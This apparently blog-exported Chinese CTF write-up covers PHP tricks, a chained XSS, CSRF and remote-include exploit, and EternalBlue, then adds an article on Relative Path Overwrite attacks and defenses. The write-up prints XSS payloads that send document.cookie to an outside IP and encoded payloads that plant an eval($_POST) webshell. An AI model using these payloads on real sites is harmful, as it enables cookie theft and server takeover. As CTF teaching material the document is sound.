<h2 id="给你的小世界"><a href="#给你的小世界" class="headerlink" title="给你的小世界"></a>给你的小世界</h2><p>　　好好地弄了下页面，编了个故事，抄了点情书，个人感觉还是挺好滴。</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr47td0na2j30vp0eyaaw.jpg" alt="1.png"><br></div>

<p>解题的话，很简单，因为只是签到教学题。<br>右键-&gt;base64-&gt;base32-&gt;base16-&gt;flag</p>
<h2 id="工商交友平台"><a href="#工商交友平台" class="headerlink" title="工商交友平台"></a>工商交友平台</h2><p>其实就是强网杯的Three hit<br>把它页面拔下来，自己后端还原了一下<br>是一个很好的二次注入题目<br>去这里看详细writeup吧 <a href="https://lalajun.github.io/2018/03/26/WEB-网强杯 WEB writeup" target="_blank" rel="external">WEB-网强杯 WEB writeup</a></p>
<h2 id="奇淫技巧"><a href="#奇淫技巧" class="headerlink" title="奇淫技巧"></a>奇淫技巧</h2><p><strong>第一关</strong>：MD5弱类型<br>md5(QNKCDZO)=md5(240610708) 0e123=0e456 这样不多说<br><strong>第二关</strong>：让你知道了下php数组a[4]是第五个字符(即a[0]是第一个字符)，直接4就可以成功<br><strong>第三关</strong>：ereg()、strpos()、strlen()<15、$_3>99999999999999999<br>ereg：搜索正则，只要不是单纯的ZJGSCTF都可以的<br>strpos：要找到ZJGSCTF<br>字符串长度小于15<br>值大于9999999999<br>payload:<br><code>100e100ZJGSCTF</code></15、$_3></p>
<p><strong>第四关</strong>：file_get_contents 文件读取函数，可以从伪协议中读取<br>猜测服务端的<code>url_allow_fopen</code>与<code>url_allow_include</code>的值</p>
<h3 id="猜测-include-On"><a href="#猜测-include-On" class="headerlink" title="猜测 include=On"></a>猜测 include=On</h3><p>此时可以使用的伪协议：<br><code>php://input</code>测试可以使用</p>
<p>但是php://input会从post中读取，肯定读取不到自定义信息，肯定包括php://input自身，不符合题目要求</p>
<p>还考虑过，修改内容长度(php://input只读取post内容中http头指定内容长度的内容)使<code>php://input</code>只读取放在前面的自定义内容，把变量=php://input放在后面。但是这样子这个变量(即php://input)不会被解析，失败。</p>
<p>还考虑过 远程包含文件，但是由于过滤<code>.</code>没有再去尝试</p>
<h3 id="猜测-fopen-On-include-On"><a href="#猜测-fopen-On-include-On" class="headerlink" title="猜测 fopen=On include=On"></a>猜测 fopen=On include=On</h3><p>另外一个伪协议，可以当做输入流被读取<br><code>data:text/plain,内容</code><br><code>data:text/plain;base64,经过base64的内容</code><br>内容写入即可</p>
<h2 id="小姐姐小姐姐，你听我说噢"><a href="#小姐姐小姐姐，你听我说噢" class="headerlink" title="小姐姐小姐姐，你听我说噢"></a>小姐姐小姐姐，你听我说噢</h2><p>感谢白猪老哥赞助的题目</p>
<h3 id="admin-view-php"><a href="#admin-view-php" class="headerlink" title="admin/view.php"></a>admin/view.php</h3><p>有全部的源码。<br>先来看<code>admin/view.php</code>，这里可以了解到我们进不去的admin用户在做什么</p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorly5xb6j30b502edfs.jpg" alt="wp6.png"><br></div>

<p>这个页面是会3秒刷新一次，形成不断查看用户提交信息的行为。<br>之后会从数据库中原原本本读出用户提交的东西，显示在<code>&lt;div&gt;</code>标签内<br>截取一个在服务端形成的页面帮助理解标签构造(自己在本地也可以通过源码自己架构网站来实现查看)</p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorn8iil5j30gx04ejr9.jpg" alt="wp7.png"><br></div>

<p>可见这个地方是可以闭合标签形成XSS的，在<code>contact.php</code>中向admin用户发送payload</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqornu65xxj30p30a5753.jpg" alt="wp8.png"><br></div>

<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqoro4akhgj30qe03iq2r.jpg" alt="wp9.png"><br></div>

<p>尝试得到XSS<br>payload:<code>&lt;/div&gt; &lt;script&gt;window.location.href=&#39;http://45.63.17.127:12345/cookie.asp?msg=&#39;+document.cookie&lt;/script&gt; &lt;div class=&quot;panel-body&quot;&gt;</code></p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorofz8caj30ig058jrp.jpg" alt="wp10.png"><br></div>

<p>失败<br>因为这里服务端<strong>PHP.INI</strong>设置了<code>session.cookie_httponly=On</code><br>如果没有设置的情况<br>换一个payload如下(两个payload效果是一样的)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;/div&gt; &lt;script&gt;var img = document.createElement(&apos;img&apos;);</div><div class="line">img.width = 0;</div><div class="line">img.height = 0;</div><div class="line">img.src = &apos;http://45.63.17.127:12345/a.php?joke=&apos;+document.cookie;&lt;/script&gt; &lt;div class=&quot;panel-body&quot;&gt;</div></pre></td></tr></table></figure></p>
<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqorov86w6j30if05mq3d.jpg" alt="wp11.png"><br></div>

<p>至此我们可以发现提交意见框存在XSS漏洞，也就是我们可以在admin用户的网页内执行任意前端代码，包括让admin用户去访问我们制定的网站，除了无法获得用户的cookie。</p>
<blockquote>
<p>ps.获得cookie是xss其中最经典的用法，xss还有其他很多利用方法，比如构造虚假页面欺骗admin用户，但在这题目中都没有利用余地，admin用户，只是打开了网页自动一直在刷新查阅消息</p>
</blockquote>
<h3 id="SERVER-‘SCRIPT-NAME’-漏洞"><a href="#SERVER-‘SCRIPT-NAME’-漏洞" class="headerlink" title="$_SERVER[‘SCRIPT_NAME’]漏洞"></a>$_SERVER[‘SCRIPT_NAME’]漏洞</h3><p>继续搜寻其他漏洞<br>查看<code>index.php</code>源码，发现其他所有js/css都是用静态位置表示对应css,js位置</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorphwnzbj30ii03lmxh.jpg" alt="wp1.png"><br></div>

<p>只有这个地方使用<code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>来获取当前网站位置</p>
<blockquote>
<p><strong>$_SERVER[‘SCPIPT_NAME’]</strong>在小于等于PHP5的版本里，会成为一个漏洞函数，它的触发还与APACHE的版本以及windows/linux系统有关。详情请见PHP漏洞函数分析一文。</p>
</blockquote>
<p>进行测试</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorpo4b79j30ga09j3ym.jpg" alt="wp2.png"><br></div>

<p>发现成功对返回的页面进行修改，尝试是否可以进一步利用。<br>payload:<code>&quot;&gt; &lt;/a&gt; 1 &lt;a  href=&quot;</code><br>形成以下构造<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"//index.php "</span>&gt;</span> <span class="tag">&lt;/<span class="name">a</span>&gt;</span> 1 <span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-default"</span>&gt;</span>Current Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorq32nyrj30ko05iglp.jpg" alt="wp3.png"><br></div>

<p>payload:<code>&quot;&gt; &lt;/a&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;a  href= /</code></p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorqf44xyj30kz09x0td.jpg" alt="wp4.png"><br></div>

<p>可以发现，形成<strong>反弹XSS</strong><br>由于我们之前已经从<code>contact.php</code>得到了XSS，转而找其他的思路——<strong>嵌入后端代码</strong></p>
<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqorqpj4ssj30wi03vdgk.jpg" alt="wp16.png"><br></div>

<p>我们可以看见嵌入php代码是成功的，但是它只会返回到页面上，不会再后端执行。</p>
<p>此处必须说明关于 <strong>$_SERVER[‘SCRIPT_NAME’]</strong> 的另一个要点：<strong>只接受URL编码的值</strong><br>在该函数提取的URL中如果有特殊符号没有被URL加密过，就会直接舍弃全部</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqorrb3y58j30uz0750tn.jpg" alt="wp12.png"><br></div>

<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorreey1yj30rp06gaat.jpg" alt="wp13.png"><br></div>

<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorrhdembj30vj07awfc.jpg" alt="wp14.png"><br></div>

<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqorrkmyc0j30uv07tjs8.jpg" alt="wp15.png"><br></div>

<p>还不接受burpsuite的+代替空格的URL编码</p>
<blockquote>
<p>ps.之前在hackbar中的数据实际上在发送前会被URL加密一次。<br>经过hackbar发送的请求，自动URL加密GET参数，不自动URL加密POST参数</p>
</blockquote>
<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><code>/admin/index.php</code> 有一处显而易见的远程文件包含<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">include</span> <span class="string">"http://localhost/"</span>.$_GET[<span class="string">'path'</span>];</div></pre></td></tr></table></figure></p>
<p>此处<strong>include</strong>会执行一次访问 “<a href="http://localhost/&quot;.$_GET[&#39;path&#39;]的返回结果" target="_blank" rel="external">http://localhost/&quot;.$_GET[&#39;path&#39;]的返回结果</a> 中的PHP代码<br>而在访问本地地址的时候会再解析一次，也就是这句话会把path指定的页面解析两次。<br>无法理解的话，请参考<a href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/" target="_blank" rel="external">lfi与rfi</a></p>
<p>但是由于之前有<code>check()</code>验证cookie。而我们不是admin用户，没法利用</p>
<p>同时这个页面，admin访问的话没有阻碍，即存在CSRF。</p>
<h3 id="组合所有漏洞"><a href="#组合所有漏洞" class="headerlink" title="组合所有漏洞"></a>组合所有漏洞</h3><p>我们知道可以通过联系admin用户的输入框控制admin界面的前端页面，此处可以嵌入<code>&lt;img src= /&gt;</code>让admin用户自动访问任意网站，形成csrf<br>我们知道可以通过<code>/admin/index.php</code>的本地文件包含，包含执行对方服务器本地存在的代码。<br>我们知道可以在<code>index.php</code>中嵌入任意php代码</p>
<p>于是一套COMBO就连成了。<br>通过<strong>输入框</strong>控制admin用户去访问<strong>/admin/index.php</strong>。在其<code>参数path</code>中让<strong>include包含</strong>被我们注入php代码的漏洞页面<strong>index.php/xxxxx</strong></p>
<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>由于我们需要看到php执行的结果，把结果写入test.php文件夹中。<br>构造php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">fwrite(fopen(<span class="string">'test.php'</span>,<span class="string">'w+'</span>),<span class="string">"&lt;?php var_dump(glob('*'));?&gt;"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>第二，由于上面我们发现<strong>$_SERVER[‘SCPIPT_NAME’]</strong>注入php代码，需要保证php代码URL编码一次<br>计算我们此处payload需要URL编码的次数，顺便理清楚执行过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">输入框内编码x次 加上 发送浏览器自动编码<span class="number">1</span>次 </div><div class="line">减去 服务器接受自动解码<span class="number">1</span>次 </div><div class="line">admin用户页面查看view页面 数据提取出数据库，原样显示到view.php页面形成图片</div><div class="line">加上 admin用户在view.php通过浏览器自动访问 服务器/admin/index.php?path=xx 页面 发送浏览器自动编码<span class="number">1</span>次</div><div class="line">减去 服务器接受请求自动解码<span class="number">1</span>次</div><div class="line">因为PATH参数 远程<span class="keyword">include</span> http:<span class="comment">//localhost/index.php/xxxxxx  #此处的xxx需要剩2次编码</span></div><div class="line">服务器 远程请求 服务器自己 </div><div class="line">减去 服务器接受自动解码<span class="number">1</span>次 </div><div class="line">$_SERVER[<span class="string">'SCPIPT_NAME'</span>] 需要保证URL编码<span class="number">1</span>次</div></pre></td></tr></table></figure>
<p>所以得出 在输入框内 需要对php内容进行2次编码</p>
<p><strong>构造payload</strong></p>
<blockquote>
<p>初始payload:查看当前目录下所有文件，包括文件夹下内容<br><code>&lt;img src=http://10.21.13.225/admin/index.php?path=index.php/&lt;?php fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&quot;&lt;?php var_dump(glob(&#39;*&#39;));?&gt;&quot;);?&gt; /&gt;</code></p>
</blockquote>
<p><code>&lt;img /&gt;</code> 等内容在admin用户 前端界面显示，所以这里不用URL加密</p>
<blockquote>
<p>对于 path=index.php/ 之后  /&gt; 之前，需要进入到最终 进行两次编码<br><code>&lt;img src=http://10.21.13.225/admin/index.php?</code><br><code>path=index.php/12%253C%253Fphp%2520fwrite%2528fopen%2528%2527test.</code><br><code>php%2527%252C%2527w%252b%2527%2529%252C%2522%253C%253Fphp%2520var_dump%2528glob%2528%252</code><br><code>7%252a%2527%2529%2529%253B%253F%253E%2522%2529%253B%253F%253E3%2520/&gt;</code>（此处为了显示，有换行）</p>
</blockquote>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorrtn1j5j30qx02xgln.jpg" alt="wp17.png"><br></div>

<p>成功，但是没有发现，既然可以写入文件，就写入web-shell吧</p>
<h3 id="关于webshell-payload的细节分析"><a href="#关于webshell-payload的细节分析" class="headerlink" title="关于webshell-payload的细节分析"></a>关于webshell-payload的细节分析</h3><ul>
<li>web-shell1：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;);</code></li>
</ul>
<p>但是<code>&quot;&lt;?php $_POST ?&gt;&quot;</code>双引号会对里面的 $_POST 进行解析,就没法原原本本写入</p>
<ul>
<li>web-shell2：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[\&#39;cmd\&#39;]);?&gt;&#39;);</code></li>
</ul>
<p>用单引号，内部对单引号要用\注释，如<code>\&#39;</code><br>但是在访问admin/index.phpURL解码一次，访问index.php时，URL编码的<code>\ -&gt; %5C</code>会被解析成目录路径，从而失败</p>
<ul>
<li>web-shell3：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;);</code></li>
</ul>
<p>考虑不使用<code>$_POST[\&#39;cmd\&#39;]</code>使用<code>$_POST[cmd]</code>，这种写法虽然会NOICE提醒错误，但是也可以使用<br>测试可行，还有更好的</p>
<ul>
<li>webshell_final：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);</code></li>
</ul>
<p>fwrite函数写入内容，外单引号，内双引号</p>
<blockquote>
<p>payload:<br><code>&lt;img src=http://10.21.13.225/admin/index.php?path=index.php/12&lt;?php fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);?&gt;3 /&gt;</code><br>finally:<br><code>&lt;img src=http://10.21.13.225/admin/index.php?</code><br><code>path=index.php/12%253C%253Fphp%2520fwrite%2528fopen%2528%2527test.</code><br><code>php%2527%252C%2527w%252b%2527%2529%252C%2527%253C%253Fphp%2520eval%2528%2524_POST</code><br><code>%255B%2522cmd%2522%255D%2529%253B%253F%253E%2527%2529%253B%253F%253E3%2520/&gt;</code>（此处为了显示，有换行）</p>
</blockquote>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqortix4e5j30pn091t98.jpg" alt="wp18.png"><br></div>

<p>接入菜刀/蚁剑，密码为shell中post参数</p>
<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqosh707b2j30cl09pmxc.jpg" alt="wp19.png"><br></div>

<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqoslgjlsaj30al02swef.jpg" alt="wp20.png"><br></div>

<h3 id="view-php的XSS攻击-为何与-include无法结合"><a href="#view-php的XSS攻击-为何与-include无法结合" class="headerlink" title="view.php的XSS攻击 为何与 include无法结合"></a>view.php的XSS攻击 为何与 include无法结合</h3><p>也可能会有人思考到，view页面有XSS，向view页面写入php代码，在让admin用户去包含view页面这样。<br>如下payload</p>
<blockquote>
<p><code>&lt;/div&gt; &lt;?php fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;123&#39;);?&gt; &lt;div class=&quot;panel-body&quot;&gt; &lt;img src=http://10.21.13.225/admin/index.php?path=admin/index.php?path=view/&gt;</code></p>
</blockquote>
<p>事实是 不可以的。<br>admin用户去访问<code>/admin/index.php</code>会让服务器去访问<code>/admin/index.php?path=view</code><br>但是服务器在访问<code>/admin/index.php</code>的时候不能通过<code>check验证</code><br>所以就没法包含进view页面的php代码。</p>
<p>那如果admin用户是在服务端的浏览器查看的，可不可以呢，也是不可以的。<br>include 远程文件 是不能包含cookie的</p>
<h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><p>以下writeup来自betamao:</p>
<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><p>使用nmap扫描发现开了443端口，为windows服务器，还开了明显被永恒之蓝入侵的端口：</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fr57hg3d27j30w00bswg6.jpg" alt=""><br></div>

<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>使用metasploit扫描果然存在漏洞：</p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fr57huj9wij314f084q2y.jpg" alt=""><br></div>

<p>直接攻击得到shell</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr57is68agj30zt0irjrs.jpg" alt=""><br></div>

<h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>太特喵的累了….把能想到的问题一一尝试，全部解决了….也算是把白猪老哥的题弄清楚了….花了好长好长时间呜呜,溜了溜了qaq</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-RPO攻击]]></title>
      <url>/2018/04/27/WEB-RPO%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<p>— RPO-相对路径覆盖攻击 —<br><a id="more"></a></p>
<h1 id="RPO攻击"><a href="#RPO攻击" class="headerlink" title="RPO攻击"></a>RPO攻击</h1><p><strong>RPO</strong>(Relative Path Overwrite) —— <strong>相对路径覆盖</strong>，是一种新型攻击技术，主要是利用浏览器的一些特性和部分服务端的配置差异导致的漏洞，通过一些技巧，我们可以通过相对路径来引入其他的资源文件，以至于达成我们想要的目的。</p>
<h2 id="RPO利用条件以及利用结果"><a href="#RPO利用条件以及利用结果" class="headerlink" title="RPO利用条件以及利用结果"></a>RPO利用条件以及利用结果</h2><p><strong>RPO攻击</strong>依赖于</p>
<ul>
<li>浏览器与服务器对于url地址解析反应的不同。这种反应的不同可以由 两者解析差异，WEB缓存技术和配置差异 造成</li>
<li>前端代码使用相对于本页目录的相对路径来加载css/js <code>../css/style.css</code> 或 <code>./style.js</code></li>
</ul>
<p><strong>利用结果</strong>:<br>浏览器把服务器返回的其他文件当做css/js来解析。通常单单RPO是没有什么作用的，因为服务器不会有什么恶意的css/js存在。<br>但是配合上一些可以控制的文件(比如可以控制php页面返回自定义css代码,或js代码)。控制服务端使其返回恶意文件+RPO形成解析，导致了<strong>XSS，信息泄露</strong>等漏洞产生。</p>
<h2 id="浏览器与服务端的差异"><a href="#浏览器与服务端的差异" class="headerlink" title="浏览器与服务端的差异"></a>浏览器与服务端的差异</h2><p>先了解关于服务端和客户端浏览器在解析和识别上的差异性，以Apache服务器和Nginx服务器为例。<br>ps.测试代码取自<a href="https://www.cnblogs.com/p00mj/p/6755000.html" target="_blank" rel="external">p00mj博客</a></p>
<h3 id="服务器对于URL的解析"><a href="#服务器对于URL的解析" class="headerlink" title="服务器对于URL的解析"></a>服务器对于URL的解析</h3><h4 id="对于-2f的解析"><a href="#对于-2f的解析" class="headerlink" title="对于%2f的解析"></a>对于%2f的解析</h4><p>对于Apache服务器：<br>访问<code>http://localhost/RPO/index.php</code>,成功</p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjrv22bhj30wt07dt9y.jpg" alt="1.png"><br></div>

<p>对于<code>/</code>URL编码<code>%2f</code><br>访问<code>http://localhost/RPO%2findex.php</code>,失败</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjry8j1tj30x7070wfj.jpg" alt="2.png"><br></div>

<p>对于Nginx服务器：<br>访问<code>http://localhost/RPO/index.php</code>,成功</p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjs2egirj30r9063q3t.jpg" alt="10.png"><br></div>

<p>访问<code>http://localhost/RPO%2findex.php</code>,成功</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjs70d09j30s005t3zd.jpg" alt="11.png"><br></div>

<p>所以</p>
<ul>
<li><strong>Nginx web服务器是会对带有%2f的URL解析的</strong></li>
<li><strong>Apache服务器时不能对带有%2f的URL进行解析的</strong></li>
</ul>
<h4 id="对于后续无意义目录的解析"><a href="#对于后续无意义目录的解析" class="headerlink" title="对于后续无意义目录的解析"></a>对于后续无意义目录的解析</h4><p>两种web服务器结果一致：<br>访问<code>http://localhost/1.php</code>,成功</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjsal32zj30v603r3yx.jpg" alt="3.png"><br></div>

<p>访问<code>http://localhost/1.php/abc/ced.js/style.css</code>,成功，并且返回时跟1.php一样的界面</p>
<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqrjuks3a2j30uo03yaan.jpg" alt="5.png"><br></div>

<p>由此可知：<br><strong>服务器在找到有内容的页面后，不会解析后续没有意义的目录</strong></p>
<h3 id="客户端浏览器对于URL的解析"><a href="#客户端浏览器对于URL的解析" class="headerlink" title="客户端浏览器对于URL的解析"></a>客户端浏览器对于URL的解析</h3><p>由于需要通过服务器的返回才能判断浏览器对于URL编码的解析，此处使用Nginx服务器。<br>访问<code>http://localhost/RPO/aa%2fbb/index.php</code>，css获取<code>../style.css</code></p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjuqvaauj30ct015web.jpg" alt="16.png"><br></div>

<p>浏览器请求的页面：<code>http://localhost/RPO/aa%2fbb/index.php</code><br>浏览器”应该”请求的CSS：<code>http://localhost/RPO/aa/index.php</code><br>浏览器实际请求的css：<code>http://localhost/RPO/style.css</code></p>
<p>由此可知:<br><strong>浏览器是不会识别%2f作为路径分割的</strong></p>
<h2 id="利用场景-pathinfho"><a href="#利用场景-pathinfho" class="headerlink" title="利用场景-pathinfho"></a>利用场景-pathinfho</h2><ul>
<li>服务端：能不能对带有%2f的URL解析的WEB服务器都行(此例子是apache服务器)</li>
<li>客户端：所以对于客户端也没有要求.</li>
<li>css获取：通过相对路径获取(此例子中<code>href=&quot;./style.css&quot;</code>)</li>
</ul>
<blockquote>
<p>之所以对于两种不同的服务器没有限定，因为实际上这种利用场景我们都是通过/去访问服务器</p>
</blockquote>
<p>先来了解浏览器根据相对路径请求css原则<br>访问<code>http://localhost/RPO/index.php/country/wei</code></p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjuyr90cj30dl018web.jpg" alt="6.png"><br></div>

<p>访问<code>http://localhost/RPO/index.php/country/wei/</code></p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjv1nziaj30f7016q2s.jpg" alt="7.png"><br></div>

<p>可以知道浏览器是根据最后一个<strong>/</strong>作为当前目录，在通过相对路径知道css地址，再向服务端去请求该地址的CSS<br>所以访问<code>http://localhost/RPO/index.php/country/wei/style.css</code>作为css<br>而通过之前对于后续无意义目录的例子，可以知道css的内容应该跟index.php的内容一致</p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjv84jwwj30qw04vaah.jpg" alt="8.png"><br></div>

<p>所以，此处就形成了<code>把php文件当做是静态文件解析</code><br>单单这种形式的漏洞，利用空间较少，你必须要能向index.php中嵌入css(如果是加载作为js的话，就是嵌入js代码)才行,除了对于IE9,IE10的也可以利用同域文件<a href="">前端小姿势</a></p>
<h3 id="pathinfo例子"><a href="#pathinfo例子" class="headerlink" title="pathinfo例子"></a>pathinfo例子</h3><p>此例子参考<a href="http://www.bendawang.site/2017/09/16/RPO%E4%BA%8C%E4%B8%89%E4%BA%8B/" target="_blank" rel="external">rpo二三事</a></p>
<p>由于我们需要能在index.php中写入css，构筑index.php代码,进入同目录下css(其内容不重要)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"style.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> /&gt;</span></div><div class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($_SERVER[<span class="string">'PHP_SELF'</span>]);</span></div><div class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;"</span>;</span></div><div class="line"><span class="php"><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>正常访问情况</p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvihfg0j30ei06tjrj.jpg" alt="12.png"><br></div>

<p>访问<code>http://localhost/index.php/payload/</code></p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvlfpmhj30du0173yc.jpg" alt="13.png"><br></div>

<p>观察css内容，意料之中执行index.php页面代码</p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjvorv45j30jm03aaa2.jpg" alt="14.png"><br></div>

<p>开始注入payload<code>{}*{background-color:red}</code></p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjvtowa5j30lj06z3yw.jpg" alt="15.png"><br></div>

<p>其他css-payload 可以参考<a href="">前端小姿势</a></p>
<h2 id="利用场景-基于-2f"><a href="#利用场景-基于-2f" class="headerlink" title="利用场景- 基于%2f"></a>利用场景- 基于%2f</h2><ul>
<li>服务器:要求可以解析URL编码的WEB服务器(此处以Nginx为例)</li>
<li>浏览器:不解析URL编码</li>
<li>css获取：通过相对路径获取</li>
</ul>
<p><strong>场景假设</strong>:index.php利用相对路径<code>../css/style.css</code>引用style.css。我们可以修改profile.php向其中注入css代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">目录结构</div><div class="line">--php -- index.php</div><div class="line">  |   |</div><div class="line">  |   -- profile.php</div><div class="line">  |</div><div class="line">  css -- style.css</div></pre></td></tr></table></figure></p>
<p>访问：<code>http://localhost/RPO/aa/php/profile.php/aa%2f..%2f../index.php</code><br>服务器视角：<code>http://localhost/RPO/aa/php/profile.php/aa/../../index.php</code>即<code>http://localhost/RPO/aa/php/index.php</code><br>浏览器视角:<code>http://localhost/RPO/aa/php/profile.php/aa%2f..%2f../index.php</code><br>CSS视角:<code>http://localhost/RPO/aa/php/profile.php/css/style.css</code><br>加上<strong>服务器对于后续无意义目录的解析</strong><br>最终实际从服务端加载的CSS：<code>http://localhost/RPO/aa/php/profile.php</code></p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvyrd1tj30mj0dnq39.jpg" alt="17.png"><br></div>

<p>所以，此处就形成了<strong>把不同目录下的php文件当做是静态文件解析</strong><br>利用的性质是:客户端与服务器对于%2f解析的不同，以及服务器对于多余目录的无视</p>
<h3 id="基于-2f的跨目录解析例子"><a href="#基于-2f的跨目录解析例子" class="headerlink" title="基于%2f的跨目录解析例子"></a>基于%2f的跨目录解析例子</h3><p>直接上CTF题目吧</p>
<p><a href="https://www.secpulse.com/archives/70070.html" target="_blank" rel="external">share your mind</a><br><a href="http://www.qingpingshan.com/m/view.php?aid=240597" target="_blank" rel="external">大物必须过</a></p>
<h2 id="防护RPO"><a href="#防护RPO" class="headerlink" title="防护RPO"></a>防护RPO</h2><ul>
<li>不使用相对路径，加载css/js : 最有效了</li>
<li>在php页面最开头，声明<code>&lt;!DOCTYPE html&gt;</code>，使用规范模式解析<br>细节请参考<a href="http://www.bendawang.site/2017/09/16/RPO%E4%BA%8C%E4%B8%89%E4%BA%8B/" target="_blank" rel="external">rpo二三事</a></li>
</ul>
